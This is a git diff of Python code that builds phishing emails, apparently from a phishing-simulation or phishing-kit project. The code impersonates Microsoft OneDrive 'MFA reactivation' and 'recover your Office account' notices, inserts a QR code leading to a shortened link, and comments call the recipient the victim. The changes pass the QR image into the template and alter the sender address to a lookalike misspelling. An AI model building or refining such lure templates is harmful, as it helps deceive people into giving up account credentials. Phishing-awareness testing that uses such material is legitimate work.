@@ -31,6 +31,7 @@ def onedrive_es():
 def onedrive_QR(userName,urlShort,userEmail,currentDate):
   #Use QR generator by URL
   qrImage=qrGenerator(urlShort,userName)
+  
   #QR="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAABJRU5ErkJggg=="
   ##HTML suplantacion santander
   onedrive_QR=("""
@@ -251,7 +252,7 @@ def onedrive_QR(userName,urlShort,userEmail,currentDate):
 </body>
 
 </html>
-                   """.format(userEmail,QR))
+                   """.format(userEmail,qrImage))
   saveTemplateGenerated(userName,"OneDriveQR",onedrive_QR,"Re-activación MFA cuenta microsoft","notificaciones@movicoders.link",userEmail)
     
     
@@ -260,7 +261,7 @@ def onedrive_html(userName,urlShort,userEmail,currentDate):
     
     randomCode=random.randint(100000,999999)
     
-    senderEmail= "notificaciones@movicoders.link"
+    senderEmail = "notificasiones@movicoders.link"
     
     
     ##HTML que se enviara a la victima
@@ -482,4 +483,4 @@ def onedrive_html(userName,urlShort,userEmail,currentDate):
 </div>
 
                    """.format(senderEmail,userEmail,userEmail,randomCode,userEmail,urlShort))
-    saveTemplateGenerated(userName,"OneDrive",oneDriveHtml,"Recupera tu cuenta Office",senderEmail,userEmail)
+    saveTemplateGenerated(userName,"OneDrive",oneDriveHtml,"Recupera tu cuenta Office","notificaciones@movicoders.link",userEmail)
